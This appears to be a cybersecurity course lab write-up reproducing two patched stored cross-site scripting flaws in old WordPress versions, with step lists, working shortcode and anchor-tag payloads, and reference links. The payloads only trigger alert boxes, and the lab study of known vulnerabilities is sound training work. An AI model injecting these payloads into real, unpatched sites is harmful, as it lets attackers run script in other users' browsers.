# CodePath Cybersecurity - week 7
### Exploit 1: Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
_CVE-2017-6817_  
_Affected versions 4.0 - 4.7.2, fixed in 4.2.13_  

#### Steps
- Create a new Post
- Switch from Visual editing mode to Text (HTML) editing mode
- Insert the malicious YouTube embed shortcode

`[embed src='https://www.youtube.com/embed/dQw4w9WgXcQ\x3csvg onload=alert("exploit!")\x3e'][/embed]`

#### References
- https://wpvulndb.com/vulnerabilities/8768
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
- https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
- https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
- https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html

#### Walkthrough
![Walkthrough exploit 1](https://i.imgur.com/LqaLZgY.gif)

### Exploit 2: Authenticated Stored Cross-Site Scripting (XSS)
_CVE-2015-5622_  
_CVE-2015-5623_  
_Affected versions 4.0 - 4.2.2, fixed in 4.2.3_  

#### Steps
- Create a new Post  
- Switch from Visual editing mode to Text (HTML) editing mode
- Insert the malicious a href code

`<a href="[caption code=">]</a><a title=" onmouseover=alert('exploit!')  ">link</a>`

#### References
- https://wpvulndb.com/vulnerabilities/8111
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
- https://wordpress.org/news/2015/07/wordpress-4-2-3/
- https://twitter.com/klikkioy/status/624264122570526720
- https://klikki.fi/adv/wordpress3.html
 
#### Walkthrough
![Walkthrough exploit 2](https://i.imgur.com/4nuw80g.gif)